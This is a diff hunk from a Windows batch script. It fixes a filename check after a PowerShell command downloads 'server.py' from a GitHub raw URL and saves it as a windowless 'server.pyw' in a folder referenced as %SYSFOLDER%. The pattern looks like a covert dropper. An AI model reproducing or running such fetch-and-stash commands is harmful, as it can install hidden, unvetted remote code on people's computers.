@@ -25,7 +25,7 @@ if not exist "%SYSFOLDER%" (
 :: === [3] Download Python script from GitHub ===
 echo [>] Downloading Python script...
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mabdullahprogrammer/files/refs/heads/main/server.py' -OutFile '%SYSFOLDER%\server.pyw'"
-if exist "%SYSFOLDER%\server.py" (
+if exist "%SYSFOLDER%\server.pyw" (
     echo [✓] Python script saved
 ) else (
     echo [X] Failed to download server.py
